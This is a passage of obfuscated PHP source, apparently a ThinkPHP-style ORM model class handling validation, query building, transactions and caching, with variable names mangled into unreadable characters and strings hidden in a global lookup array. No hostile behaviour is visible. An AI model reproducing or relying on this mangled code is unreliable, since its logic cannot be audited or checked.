return !0; } if (think_config($…à’Œ¢ï[341])) { $™Ò´÷²Á = think_config($…à’Œ¢ï[342]); if (!isset($•Õ©´şÁ[$™Ò´÷²Á]) || Session::get($™Ò´÷²Á)) { return !1; } list($Õ†®ŠÆ¯, $Ë±û…£¡) = explode($…à’Œ¢ï[11], $•Õ©´şÁ[$™Ò´÷²Á]); if ($Ë±û…£¡ && Session::get($™Ò´÷²Á . $…à’Œ¢ï[10] . $Õ†®ŠÆ¯) === $Ë±û…£¡) { Session::remove($™Ò´÷²Á . $…à’Œ¢ï[10] . $Õ†®ŠÆ¯); return !0; } if (think_config($…à’Œ¢ï[345])) { Session::remove($™Ò´÷²Á . $…à’Œ¢ï[10] . $Õ†®ŠÆ¯); } return !1; } return !0; } public function regex($×Ÿ£®”•, $æõ·À¾Õ) { $Çİ·Ò³Å =& $_SERVER[™»È’øè]; $ı¦•½è = array($Çİ·Ò³Å[346] => $Çİ·Ò³Å[347], $Çİ·Ò³Å[348] => $Çİ·Ò³Å[349], $Çİ·Ò³Å[350] => $Çİ·Ò³Å[351], $Çİ·Ò³Å[352] => $Çİ·Ò³Å[353], $Çİ·Ò³Å[354] => $Çİ·Ò³Å[355], $Çİ·Ò³Å[356] => $Çİ·Ò³Å[357], $Çİ·Ò³Å[358] => $Çİ·Ò³Å[359], $Çİ·Ò³Å[333] => $Çİ·Ò³Å[360], $Çİ·Ò³Å[361] => $Çİ·Ò³Å[362]); if (isset($ı¦•½è[strtolower($æõ·À¾Õ)])) { $æõ·À¾Õ = $ı¦•½è[strtolower($æõ·À¾Õ)]; } return preg_match($æõ·À¾Õ, $×Ÿ£®”•) === 1; } private function autoOperation(&$æ×—Š×”, $¸ïŒªŠõ) { $¤¶‡¬ûÊ =& $_SERVER[™»È’øè]; if (!empty($this->options[$¤¶‡¬ûÊ[363]])) { $º‹ëê­ = $this->options[$¤¶‡¬ûÊ[363]]; unset($this->options[$¤¶‡¬ûÊ[363]]); } elseif (!empty($this->_auto)) { $º‹ëê­ = $this->_auto; } if (isset($º‹ëê­)) { foreach ($º‹ëê­ as $Ì¼îŠ÷¡) { if (empty($Ì¼îŠ÷¡[2])) { $Ì¼îŠ÷¡[2] = THINK_MODEL_INSERT; } if ($¸ïŒªŠõ == $Ì¼îŠ÷¡[2] || $Ì¼îŠ÷¡[2] == THINK_MODEL_BOTH) { switch (trim($Ì¼îŠ÷¡[3])) { case $¤¶‡¬ûÊ[364]: case $¤¶‡¬ûÊ[365]: $„¸¤ŸŞ = isset($Ì¼îŠ÷¡[4]) ? (array) $Ì¼îŠ÷¡[4] : array(); if (isset($æ×—Š×”[$Ì¼îŠ÷¡[0]])) { array_unshift($„¸¤ŸŞ, $æ×—Š×”[$Ì¼îŠ÷¡[0]]); } if ($¤¶‡¬ûÊ[364] == $Ì¼îŠ÷¡[3]) { $æ×—Š×”[$Ì¼îŠ÷¡[0]] = call_user_func_array($Ì¼îŠ÷¡[1], $„¸¤ŸŞ); } else { $æ×—Š×”[$Ì¼îŠ÷¡[0]] = call_user_func_array(array(&$this, $Ì¼îŠ÷¡[1]), $„¸¤ŸŞ); } break; case $¤¶‡¬ûÊ[316]: $æ×—Š×”[$Ì¼îŠ÷¡[0]] = $æ×—Š×”[$Ì¼îŠ÷¡[1]]; break; case $¤¶‡¬ûÊ[366]: if ($¤¶‡¬ûÊ[12] === $æ×—Š×”[$Ì¼îŠ÷¡[0]]) { unset($æ×—Š×”[$Ì¼îŠ÷¡[0]]); } break; case $¤¶‡¬ûÊ[367]: default: $æ×—Š×”[$Ì¼îŠ÷¡[0]] = $Ì¼îŠ÷¡[1]; } if (!1 === $æ×—Š×”[$Ì¼îŠ÷¡[0]]) { unset($æ×—Š×”[$Ì¼îŠ÷¡[0]]); } } } } return $æ×—Š×”; } protected function autoValidation($™î„¥Õê, $Á«ÛŸô) { $»„Ê÷À =& $_SERVER[™»È’øè]; if (!empty($this->options[$»„Ê÷À[368]])) { $µ•üŒº… = $this->options[$»„Ê÷À[368]]; unset($this->options[$»„Ê÷À[368]]); } elseif (!empty($this->_validate)) { $µ•üŒº… = $this->_validate; } if (isset($µ•üŒº…)) { if ($this->patchValidate) { $this->error = array(); } foreach ($µ•üŒº… as $¢ƒó€¾ => $Ìİ„û•) { if (empty($Ìİ„û•[5]) || $Ìİ„û•[5] == THINK_MODEL_BOTH || $Ìİ„û•[5] == $Á«ÛŸô) { if (0 == strpos($Ìİ„û•[2], $»„Ê÷À[369]) && strpos($Ìİ„û•[2], $»„Ê÷À[370])) { $Ìİ„û•[2] = think_lang(substr($Ìİ„û•[2], 2, -1)); } $Ìİ„û•[3] = isset($Ìİ„û•[3]) ? $Ìİ„û•[3] : THINK_EXISTS_VALIDATE; $Ìİ„û•[4] = isset($Ìİ„û•[4]) ? $Ìİ„û•[4] : $»„Ê÷À[371]; switch ($Ìİ„û•[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($™î„¥Õê, $Ìİ„û•)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($»„Ê÷À[12] != trim($™î„¥Õê[$Ìİ„û•[0]])) { if (!1 === $this->_validationField($™î„¥Õê, $Ìİ„û•)) { return !1; } } break; default: if (isset($™î„¥Õê[$Ìİ„û•[0]])) { if (!1 === $this->_validationField($™î„¥Õê, $Ìİ„û•)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($»›ñˆ¦ó, $Ù•Àñş) { if (!1 === $this->_validationFieldItem($»›ñˆ¦ó, $Ù•Àñş)) { if ($this->patchValidate) { $this->error[$Ù•Àñş[0]] = $Ù•Àñş[2]; } else { $this->error = $Ù•Àñş[2]; return !1; } } return; } protected function _validationFieldItem($Ï›ù‡·, $ê­ö×Ôá) { $‚®¸–ã¡ =& $_SERVER[™»È’øè]; switch (strtolower(trim($ê­ö×Ôá[4]))) { case $‚®¸–ã¡[364]: case $‚®¸–ã¡[365]: $ûÙ¬†™ = isset($ê­ö×Ôá[6]) ? (array) $ê­ö×Ôá[6] : array(); if (is_string($ê­ö×Ôá[0]) && strpos($ê­ö×Ôá[0], $‚®¸–ã¡[50])) { $ê­ö×Ôá[0] = explode($‚®¸–ã¡[50], $ê­ö×Ôá[0]); } if (is_array($ê­ö×Ôá[0])) { foreach ($ê­ö×Ôá[0] as $ˆß‹µ¬) { $ÙÕİæŠã[$ˆß‹µ¬] = $Ï›ù‡·[$ˆß‹µ¬]; } array_unshift($ûÙ¬†™, $ÙÕİæŠã); } else { array_unshift($ûÙ¬†™, $Ï›ù‡·[$ê­ö×Ôá[0]]); } if ($‚®¸–ã¡[364] == $ê­ö×Ôá[4]) { return call_user_func_array($ê­ö×Ôá[1], $ûÙ¬†™); } else { return call_user_func_array(array(&$this, $ê­ö×Ôá[1]), $ûÙ¬†™); } case $‚®¸–ã¡[372]: return $Ï›ù‡·[$ê­ö×Ôá[0]] == $Ï›ù‡·[$ê­ö×Ôá[1]]; case $‚®¸–ã¡[373]: if (is_string($ê­ö×Ôá[0]) && strpos($ê­ö×Ôá[0], $‚®¸–ã¡[50])) { $ê­ö×Ôá[0] = explode($‚®¸–ã¡[50], $ê­ö×Ôá[0]); } $±Â›½Í— = array(); if (is_array($ê­ö×Ôá[0])) { foreach ($ê­ö×Ôá[0] as $ˆß‹µ¬) { $±Â›½Í—[$ˆß‹µ¬] = $Ï›ù‡·[$ˆß‹µ¬]; } } else { $±Â›½Í—[$ê­ö×Ôá[0]] = $Ï›ù‡·[$ê­ö×Ôá[0]]; } if (!empty($Ï›ù‡·[$this->getPk()])) { $±Â›½Í—[$this->getPk()] = array($‚®¸–ã¡[374], $Ï›ù‡·[$this->getPk()]); } if ($this->where($±Â›½Í—)->find()) { return !1; } return !0; default: return $this->check($Ï›ù‡·[$ê­ö×Ôá[0]], $ê­ö×Ôá[1], $ê­ö×Ôá[4]); } } public function check($´­ÄÊ»–, $¿ÒˆûØ, $˜ˆ”ı°ñ = "\162\145\x67\x65\170") { $Œ”Şæ­ø =& $_SERVER[™»È’øè]; $˜ˆ”ı°ñ = strtolower(trim($˜ˆ”ı°ñ)); switch ($˜ˆ”ı°ñ) { case $Œ”Şæ­ø[7]: case $Œ”Şæ­ø[375]: $­š—ßà± = is_array($¿ÒˆûØ) ? $¿ÒˆûØ : explode($Œ”Şæ­ø[50], $¿ÒˆûØ); return $˜ˆ”ı°ñ == $Œ”Şæ­ø[7] ? in_array($´­ÄÊ»–, $­š—ßà±) : !in_array($´­ÄÊ»–, $­š—ßà±); case $Œ”Şæ­ø[376]: case $Œ”Şæ­ø[377]: if (is_array($¿ÒˆûØ)) { $£Ÿ¶œ‹¹ = $¿ÒˆûØ[0]; $´Ğ³¤«— = $¿ÒˆûØ[1]; } else { list($£Ÿ¶œ‹¹, $´Ğ³¤«—) = explode($Œ”Şæ­ø[50], $¿ÒˆûØ); } return $˜ˆ”ı°ñ == $Œ”Şæ­ø[376] ? $´­ÄÊ»– >= $£Ÿ¶œ‹¹ && $´­ÄÊ»– <= $´Ğ³¤«— : $´­ÄÊ»– < $£Ÿ¶œ‹¹ || $´­ÄÊ»– > $´Ğ³¤«—; case $Œ”Şæ­ø[378]: case $Œ”Şæ­ø[379]: return $˜ˆ”ı°ñ == $Œ”Şæ­ø[378] ? $´­ÄÊ»– == $¿ÒˆûØ : $´­ÄÊ»– != $¿ÒˆûØ; case $Œ”Şæ­ø[380]: $ì§è°ÇÌ = mb_strlen($´­ÄÊ»–, $Œ”Şæ­ø[381]); if (strpos($¿ÒˆûØ, $Œ”Şæ­ø[50])) { list($£Ÿ¶œ‹¹, $´Ğ³¤«—) = explode($Œ”Şæ­ø[50], $¿ÒˆûØ); return $ì§è°ÇÌ >= $£Ÿ¶œ‹¹ && $ì§è°ÇÌ <= $´Ğ³¤«—; } else { return $ì§è°ÇÌ == $¿ÒˆûØ; } case $Œ”Şæ­ø[382]: list($Ç¾Ë»Œ, $¨®±Û•Ş) = explode($Œ”Şæ­ø[50], $¿ÒˆûØ); if (!is_numeric($Ç¾Ë»Œ)) { $Ç¾Ë»Œ = strtotime($Ç¾Ë»Œ); } if (!is_numeric($¨®±Û•Ş)) { $¨®±Û•Ş = strtotime($¨®±Û•Ş); } return NOW_TIME >= $Ç¾Ë»Œ && NOW_TIME <= $¨®±Û•Ş; case $Œ”Şæ­ø[383]: return in_array(get_client_ip(), explode($Œ”Şæ­ø[50], $¿ÒˆûØ)); case $Œ”Şæ­ø[384]: return !in_array(get_client_ip(), explode($Œ”Şæ­ø[50], $¿ÒˆûØ)); case $Œ”Şæ­ø[371]: default: return $this->regex($´­ÄÊ»–, $¿ÒˆûØ); } } public function query($¬ÏË¨€, $ş»ÜàÚÜ = false) { $ëÂëüİ» =& $_SERVER[™»È’øè]; if (!is_bool($ş»ÜàÚÜ) && !is_array($ş»ÜàÚÜ)) { $ş»ÜàÚÜ = func_get_args(); array_shift($ş»ÜàÚÜ); } $¬ÏË¨€ = str_replace(array($ëÂëüİ»[245], $ëÂëüİ»[385]), $ëÂëüİ»[53], $¬ÏË¨€); $¬ÏË¨€ = $this->parseSql($¬ÏË¨€, $ş»ÜàÚÜ); return $this->db->query($¬ÏË¨€); } public function execute($ïüÔ¬, $Ò‡öäĞè = false) { if (!is_bool($Ò‡öäĞè) && !is_array($Ò‡öäĞè)) { $Ò‡öäĞè = func_get_args(); array_shift($Ò‡öäĞè); } $ïüÔ¬ = $this->parseSql($ïüÔ¬, $Ò‡öäĞè); return $this->db->execute($ïüÔ¬); } protected function parseSql($¼Úà…«ü, $éÉäš’¿) { $ÀÅ»ç÷’ =& $_SERVER[™»È’øè]; if (!0 === $éÉäš’¿) { $£è†¼÷‡ = $this->_parseOptions(); $¼Úà…«ü = $this->db->parseSql($¼Úà…«ü, $£è†¼÷‡); } elseif (is_array($éÉäš’¿)) { $éÉäš’¿ = array_map(array($this->db, $ÀÅ»ç÷’[386]), $éÉäš’¿); $¼Úà…«ü = vsprintf($¼Úà…«ü, $éÉäš’¿); } else { $¼Úà…«ü = strtr($¼Úà…«ü, array($ÀÅ»ç÷’[387] => $this->getTableName(), $ÀÅ»ç÷’[388] => think_config($ÀÅ»ç÷’[287]))); } $this->db->setModel($this->name); return $¼Úà…«ü; } public function db($ş‰¼´äÓ = '', $ı½¼Ñƒ = '', $‹£ëÇÑ¶ = array()) { $Â§Ù İ =& $_SERVER[™»È’øè]; if ($Â§Ù İ[12] === $ş‰¼´äÓ && $this->db) { return $this->db; } static $õ£¾­Óö = array(); static $ìÕ¥ú®§ = array(); if (!isset($ìÕ¥ú®§[$ş‰¼´äÓ]) || isset($ìÕ¥ú®§[$ş‰¼´äÓ]) && $ı½¼Ñƒ && $õ£¾­Óö[$ş‰¼´äÓ] != $ı½¼Ñƒ) { if (!empty($ı½¼Ñƒ) && is_string($ı½¼Ñƒ) && !1 === strpos($ı½¼Ñƒ, $Â§Ù İ[8])) { $ı½¼Ñƒ = think_config($ı½¼Ñƒ); } $ş‰¼´äÓ = think_guid($ı½¼Ñƒ); $ìÕ¥ú®§[$ş‰¼´äÓ] = Db::getInstance($ı½¼Ñƒ); } elseif (NULL === $ı½¼Ñƒ) { $ìÕ¥ú®§[$ş‰¼´äÓ]->close(); unset($ìÕ¥ú®§[$ş‰¼´äÓ]); return; } if (!empty($‹£ëÇÑ¶)) { if (is_string($‹£ëÇÑ¶)) { parse_str($‹£ëÇÑ¶, $‹£ëÇÑ¶); } foreach ($‹£ëÇÑ¶ as $²ñââÆÒ => $›Á°Å³ï) { $this->setProperty($²ñââÆÒ, $›Á°Å³ï); } } $õ£¾­Óö[$ş‰¼´äÓ] = $ı½¼Ñƒ; $this->db = $ìÕ¥ú®§[$ş‰¼´äÓ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $÷ÁÕ­ù = get_class($this); if ($÷ÁÕ­ù == $_SERVER[™»È’øè][389]) { return $this->name; } $this->name = substr($÷ÁÕ­ù, 0, -5); } return $this->name; } public function getTableName() { $İìôÁÄ­ =& $_SERVER[™»È’øè]; if (empty($this->trueTableName)) { $îÇè®ûş = !empty($this->tablePrefix) ? $this->tablePrefix : $İìôÁÄ­[12]; if (!empty($this->tableName)) { $îÇè®ûş .= $this->tableName; } else { $îÇè®ûş .= think_parse_name($this->name); } $this->trueTableName = strtolower($îÇè®ûş); } return (!empty($this->dbName) ? $this->dbName . $İìôÁÄ­[10] : $İìôÁÄ­[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¤ßœıØ÷ =& $_SERVER[™»È’øè]; return isset($this->fields[$¤ßœıØ÷[294]]) ? $this->fields[$¤ßœıØ÷[294]] : $this->pk; } public function getDbFields() { $êŞÀü¤‡ =& $_SERVER[™»È’øè]; if (isset($this->options[$êŞÀü¤‡[322]])) { $³¾Ö‰ŞÎ = $this->db->getFields($this->options[$êŞÀü¤‡[322]]); return $³¾Ö‰ŞÎ ? array_keys($³¾Ö‰ŞÎ) : !1; } if ($this->fields) { $³¾Ö‰ŞÎ = $this->fields; unset($³¾Ö‰ŞÎ[$êŞÀü¤‡[293]], $³¾Ö‰ŞÎ[$êŞÀü¤‡[294]], $³¾Ö‰ŞÎ[$êŞÀü¤‡[295]], $³¾Ö‰ŞÎ[$êŞÀü¤‡[292]]); return $³¾Ö‰ŞÎ; } return !1; } public function data($À°Àõ¡ö = '') { $‡ ¹‘ûı =& $_SERVER[™»È’øè]; if ($‡ ¹‘ûı[12] === $À°Àõ¡ö && !empty($this->data)) { return $this->data; } if (is_object($À°Àõ¡ö)) { $À°Àõ¡ö = get_object_vars($À°Àõ¡ö); } elseif (is_string($À°Àõ¡ö)) { parse_str($À°Àõ¡ö, $À°Àõ¡ö); } elseif (!is_array($À°Àõ¡ö)) { think_exception(think_lang($‡ ¹‘ûı[314])); } $this->data = $À°Àõ¡ö; return $this; } public function join($²Š¿Ã”€) { $ªÙŞö¢ =& $_SERVER[™»È’øè]; if (is_array($²Š¿Ã”€)) { $this->options[$ªÙŞö¢[325]] = $²Š¿Ã”€; } elseif (!empty($²Š¿Ã”€)) { $this->options[$ªÙŞö¢[325]][] = $²Š¿Ã”€; } return $this; } public function union($õ¸…ÄĞµ, $»´§‡±· = false) { $‰‹Ú€ø =& $_SERVER[™»È’øè]; if (empty($õ¸…ÄĞµ)) { return $this; } if ($»´§‡±·) { $this->options[$‰‹Ú€ø[390]][$‰‹Ú€ø[391]] = !0; } if (is_object($õ¸…ÄĞµ)) { $õ¸…ÄĞµ = get_object_vars($õ¸…ÄĞµ); } if (is_string($õ¸…ÄĞµ)) { $’³ùŞÇ– = $õ¸…ÄĞµ; } elseif (is_array($õ¸…ÄĞµ)) { if (isset($õ¸…ÄĞµ[0])) { $this->options[$‰‹Ú€ø[390]] = array_merge($this->options[$‰‹Ú€ø[390]], $õ¸…ÄĞµ); return $this; } else { $’³ùŞÇ– = $õ¸…ÄĞµ; } } else { think_exception(think_lang($‰‹Ú€ø[314])); } $this->options[$‰‹Ú€ø[390]][] = $’³ùŞÇ–; return $this; } public function cache($ÍŞ™—ºÓ = true, $îŸÜÂ‰ = null, $Õáìª¡ô = '') { $ï™ğÈ€â =& $_SERVER[™»È’øè]; if (!1 !== $ÍŞ™—ºÓ) { $this->options[$ï™ğÈ€â[392]] = array($ï™ğÈ€â[94] => $ÍŞ™—ºÓ, $ï™ğÈ€â[382] => $îŸÜÂ‰, $ï™ğÈ€â[33] => $Õáìª¡ô); } return $this; } public function field($‚àÃØŠ¹, $ªõÏÁ×Ç = false) { $Ü–ÙüÌª =& $_SERVER[™»È’øè]; if (!0 === $‚àÃØŠ¹) { $íêÉæ„š = $this->getDbFields(); $‚àÃØŠ¹ = $íêÉæ„š ? $íêÉæ„š : $Ü–ÙüÌª[202]; } elseif ($ªõÏÁ×Ç) { if (is_string($‚àÃØŠ¹)) { $‚àÃØŠ¹ = explode($Ü–ÙüÌª[50], $‚àÃØŠ¹); } $íêÉæ„š = $this->getDbFields(); $‚àÃØŠ¹ = $íêÉæ„š ? array_diff($íêÉæ„š, $‚àÃØŠ¹) : $‚àÃØŠ¹; } $this->options[$Ü–ÙüÌª[316]] = $‚àÃØŠ¹; return $this; } public function scope($¼ÆíÁ¥ = '', $Ö°çªŸ = NULL) { $’‘´¢œ€ =& $_SERVER[™»È’øè]; if ($’‘´¢œ€[12] === $¼ÆíÁ¥) { if (isset($this->_scope[$’‘´¢œ€[37]])) { $Ñ÷«¶™ = $this->_scope[$’‘´¢œ€[37]]; } else { return $this; } } elseif (is_string($¼ÆíÁ¥)) { $Ú¨†”íá = explode($’‘´¢œ€[50], $¼ÆíÁ¥); $Ñ÷«¶™ = array(); foreach ($Ú¨†”íá as $İÒªîŸ) { if (!isset($this->_scope[$İÒªîŸ])) { continue; } $Ñ÷«¶™ = array_merge($Ñ÷«¶™, $this->_scope[$İÒªîŸ]); } if (!empty($Ö°çªŸ) && is_array($Ö°çªŸ)) { $Ñ÷«¶™ = array_merge($Ñ÷«¶™, $Ö°çªŸ); } } elseif (is_array($¼ÆíÁ¥)) { $Ñ÷«¶™ = $¼ÆíÁ¥; } if (is_array($Ñ÷«¶™) && !empty($Ñ÷«¶™)) { $this->options = array_merge($this->options, array_change_key_case($Ñ÷«¶™)); } return $this; } public function where($‰Í“Î‘ê, $›«à´§š = null) { $¾—È–ò =& $_SERVER[™»È’øè]; if (!is_null($›«à´§š) && is_string($‰Í“Î‘ê)) { if (!is_array($›«à´§š)) { $›«à´§š = func_get_args(); array_shift($›«à´§š); } $›«à´§š = array_map(array($this->db, $¾—È–ò[386]), $›«à´§š); $‰Í“Î‘ê = vsprintf($‰Í“Î‘ê, $›«à´§š); } elseif (is_object($‰Í“Î‘ê)) { $‰Í“Î‘ê = get_object_vars($‰Í“Î‘ê); } elseif (is_array($‰Í“Î‘ê)) { foreach ($‰Í“Î‘ê as $«Ç¹®Å• => $üë¹¥¾Ç) { if ((is_numeric($«Ç¹®Å•) || !$«Ç¹®Å•) && is_string($üë¹¥¾Ç)) { if (strpos($üë¹¥¾Ç, $¾—È–ò[393]) === 0) { continue; } think_trace($¾—È–ò[394], $¾—È–ò[12], $¾—È–ò[49]); die; } } } if (is_string($‰Í“Î‘ê) && $¾—È–ò[12] != $‰Í“Î‘ê) { $÷°£‚ã = array(); $÷°£‚ã[$¾—È–ò[395]] = $‰Í“Î‘ê; $‰Í“Î‘ê = $÷°£‚ã; } if (isset($this->options[$¾—È–ò[318]])) { $this->options[$¾—È–ò[318]] = array_merge($this->options[$¾—È–ò[318]], $‰Í“Î‘ê); } else { $this->options[$¾—È–ò[318]] = $‰Í“Î‘ê; } return $this; } public function limit($ŞÀïÁ­ä, $–±ƒÖ˜ = null) { $ÌäİŠ‚™ =& $_SERVER[™»È’øè]; $this->options[$ÌäİŠ‚™[335]] = is_null($–±ƒÖ˜) ? $ŞÀïÁ­ä : $ŞÀïÁ­ä . $ÌäİŠ‚™[50] . $–±ƒÖ˜; return $this; } public function page($ÃÄ¾…Ï°, $£ÖˆÜØ = null) { $Â°ñø§ç =& $_SERVER[™»È’øè]; $this->options[$Â°ñø§ç[396]] = is_null($£ÖˆÜØ) ? $ÃÄ¾…Ï° : $ÃÄ¾…Ï° . $Â°ñø§ç[50] . $£ÖˆÜØ; return $this; } public function comment($È°Á˜€ğ) { $this->options[$_SERVER[™»È’øè][397]] = $È°Á˜€ğ; return $this; } public function setProperty($¿é’ôõ , $¢çıòïŸ) { if (property_exists($this, $¿é’ôõ )) { $this->{$¿é’ôõ } = $¢çıòïŸ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\146\171\x54\x69\155\x65", "\164\151\155\145", "\x69\156\163\x65\162\x74\54\x75\x70\144\141\x74\x65", "\146\165\x6e\x63\164\151\157\x6e"), array("\143\x72\x65\141\x74\145\124\x69\155\145", "\x74\x69\155\x65", "\151\156\x73\x65\162\164", "\146\165\x6e\143\164\x69\x6f\156")); public function setDataAuto($ûÇ¤àÌƒ) { $this->dataAuto = $ûÇ¤àÌƒ; } public function __construct($şğ©ÈµÚ = '', $®®Àºª´ = '', $è»¸üì„ = '') { parent::__construct($şğ©ÈµÚ, $®®Àºª´, $è»¸üì„); } protected $tableMeta = array(); protected function _beforeInsert(&$¹¹Ù›°½, $¡˜à¾˜) { $œ´İÍƒ‚ =& $_SERVER[™»È’øè]; if (!$this->checkDataAutoHas($œ´İÍƒ‚[398])) { return; } $this->dataBeforeFilter($¹¹Ù›°½, $œ´İÍƒ‚[398]); } protected function _beforeUpdate(&$Èá¢—š, $…•¨ûªÑ) { $ŠÆ¸€ Ó =& $_SERVER[™»È’øè]; if (!$this->checkDataAutoHas($ŠÆ¸€ Ó[399])) { return; } $this->dataBeforeFilter($Èá¢—š, $ŠÆ¸€ Ó[399]); } protected function _afterSelect(&$ÂÅú¤÷½, $“Õ²ƒ“ó) { if (!is_array($ÂÅú¤÷½)) { return; } if (!$this->checkDataAutoHas($_SERVER[™»È’øè][400])) { return; } foreach ($ÂÅú¤÷½ as &$Ô—½£¨) { $this->dataAfterFilter($Ô—½£¨); } unset($Ô—½£¨); } protected function _afterFind(&$Ş¯®¯, $÷©®ªé) { if (!is_array($Ş¯®¯)) { return; } if (!$this->checkDataAutoHas($_SERVER[™»È’øè][400])) { return; } $this->dataAfterFilter($Ş¯®¯); } public static function textEncode($üÙ±ÈÔ®) { if (!$üÙ±ÈÔ®) { return $üÙ±ÈÔ®; } $õÛ©±ÔÁ = json_encode($üÙ±ÈÔ®); $õÛ©±ÔÁ = preg_replace_callback($_SERVER[™»È’øè][401], function ($è£š¦‹ñ) { return addslashes($è£š¦‹ñ[0]); }, $õÛ©±ÔÁ); return json_decode($õÛ©±ÔÁ); } public static function textDecode($¥èŠÜ¢ï) { $¨é†ÊÕ’ =& $_SERVER[™»È’øè]; $¡Âíôêú = json_encode($¥èŠÜ¢ï); $¡Âíôêú = preg_replace_callback($¨é†ÊÕ’[402], function ($âĞÄÏë) { return $_SERVER[™»È’øè][97]; }, $¡Âíôêú); return json_decode($¡Âíôêú); } public function setAutoIncrement($¯²—åä) { $èÜ‚î = array($this->getPk() => $¯²—åä); $ëáæ›ÀÒ = $this->data($èÜ‚î)->add(); if ($ëáæ›ÀÒ) { $this->delete($ëáæ›ÀÒ); } } public function getAutoIncrement() { $á˜¤ªÅš = $this->getTableName(); $ƒ›Ö”¹Ì = $this->max($this->getPk()); $°ØÆÖâ¡ = $this->query("\163\150\x6f\167\x20\164\x61\142\x6c\145\x20\163\164\x61\164\x75\163\x20\167\150\x65\162\x65\40\116\x61\155\145\75\x27{$á˜¤ªÅš}\47"); $¾Â¬×ô = $°ØÆÖâ¡[0][$_SERVER[™»È’øè][403]]; $Í¯ŸûÛó = max($ƒ›Ö”¹Ì, $¾Â¬×ô); return $Í¯ŸûÛó; } protected function _callBefore($àó£”ü¬, $Çõ§µ„£) { return $this->cacheCallCheck($àó£”ü¬, $Çõ§µ„£, !1); } protected function _callAfter($¶ŒŠæÆë, $•³¹Â„ê) { return $this->cacheCallCheck($¶ŒŠæÆë, $•³¹Â„ê, !0); } protected function cacheFunctionAlias($×ÌÖ‰ê€) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¸ƒ‘ó×, $®Â£İì, $ÆÙÄ£»¬ = false) { $òŒ‹¿Äã = $this->cacheFunctionAlias($®Â£İì); if (!$òŒ‹¿Äã) { return; } foreach ($òŒ‹¿Äã as $ëÎô·‡¿ => $ùú‰‰í£) { $µŒÀıå­ = $ùú‰‰í£[0]; $»®ş…ÒÉ = explode($_SERVER[™»È’øè][50], $ùú‰‰í£[1]); if ($¸ƒ‘ó× == $ëÎô·‡¿) { return $this->cacheFunctionGet($ëÎô·‡¿, $µŒÀıå­); } if ($ÆÙÄ£»¬ && in_array($¸ƒ‘ó×, $»®ş…ÒÉ)) { $this->cacheFunctionClear($ëÎô·‡¿, $µŒÀıå­); } } } public function cacheFunctionGet($üŠ÷šÇ, $‹æş®) { $âŒ­ğÙè = $this->cacheKeyMake($üŠ÷šÇ, $‹æş®); $¢ØÒÒ€³ = Cache::get($âŒ­ğÙè); if (!is_array($¢ØÒÒ€³)) { $¢ØÒÒ€³ = call_user_func_array(array($this, $üŠ÷šÇ), array($‹æş®, !0)); Cache::set($âŒ­ğÙè, $¢ØÒÒ€³); } return $¢ØÒÒ€³; } public function cacheFunctionClear($©–Äî÷, $‹şÊ³ìø) { $úÁı‹Ÿ“ = $‹şÊ³ìø; if (!is_array($‹şÊ³ìø)) { $úÁı‹Ÿ“ = array($‹şÊ³ìø); } foreach ($úÁı‹Ÿ“ as $‰­¼ÔÀŞ) { $ÜËÁù¸ş = $this->cacheKeyMake($©–Äî÷, $‰­¼ÔÀŞ); Cache::remove($ÜËÁù¸ş); } } private function cacheKeyMake($åÀ”Ñè, $îåîü’) { $Ï¨²·ˆ¿ =& $_SERVER[™»È’øè]; return get_class($this) . $Ï¨²·ˆ¿[11] . $åÀ”Ñè . $Ï¨²·ˆ¿[404] . $îåîü’; } protected function selectPageReset() { $‘ú¸ùñÓ =& $_SERVER[™»È’øè]; if (isset($GLOBALS[$‘ú¸ùñÓ[405]])) { return; } $GLOBALS[$‘ú¸ùñÓ[405]] = isset($GLOBALS[$‘ú¸ùñÓ[7]][$‘ú¸ùñÓ[406]]) ? $GLOBALS[$‘ú¸ùñÓ[7]][$‘ú¸ùñÓ[406]] : !1; $GLOBALS[$‘ú¸ùñÓ[407]] = isset($GLOBALS[$‘ú¸ùñÓ[7]][$‘ú¸ùñÓ[396]]) ? $GLOBALS[$‘ú¸ùñÓ[7]][$‘ú¸ùñÓ[396]] : !1; $GLOBALS[$‘ú¸ùñÓ[7]][$‘ú¸ùñÓ[406]] = !1; $GLOBALS[$‘ú¸ùñÓ[7]][$‘ú¸ùñÓ[396]] = !1; } protected function selectPageRestore() { $¶“É×áÙ =& $_SERVER[™»È’øè]; if (!isset($GLOBALS[$¶“É×áÙ[405]])) { return; } $GLOBALS[$¶“É×áÙ[7]][$¶“É×áÙ[406]] = $GLOBALS[$¶“É×áÙ[405]]; $GLOBALS[$¶“É×áÙ[7]][$¶“É×áÙ[396]] = $GLOBALS[$¶“É×áÙ[407]]; if ($GLOBALS[$¶“É×áÙ[7]][$¶“É×áÙ[406]] === !1) { unset($GLOBALS[$¶“É×áÙ[7]][$¶“É×áÙ[406]]); } if ($GLOBALS[$¶“É×áÙ[7]][$¶“É×áÙ[396]] === !1) { unset($GLOBALS[$¶“É×áÙ[7]][$¶“É×áÙ[396]]); } unset($GLOBALS[$¶“É×áÙ[405]]); unset($GLOBALS[$¶“É×áÙ[407]]); } protected function selectPage($©·×¥Ó = 200, $…‹Š‘«‹ = 1) { $¾°±ôÊ =& $_SERVER[™»È’øè]; global $in; $—›ùËß = $this->optionsValue(); $éÚã’ì¸ = 50000; $©·×¥Ó = isset($in[$¾°±ôÊ[406]]) && $in[$¾°±ôÊ[406]] ? $in[$¾°±ôÊ[406]] : $©·×¥Ó; if ($©·×¥Ó === -1) { $in[$¾°±ôÊ[406]] = !1; $éÚã’ì¸ = 100000000; $©·×¥Ó = $éÚã’ì¸; } $¦üàÀè¦ = $—›ùËß; $¦üàÀè¦[$¾°±ôÊ[408]] = array(); $©·×¥Ó = intval($©·×¥Ó); 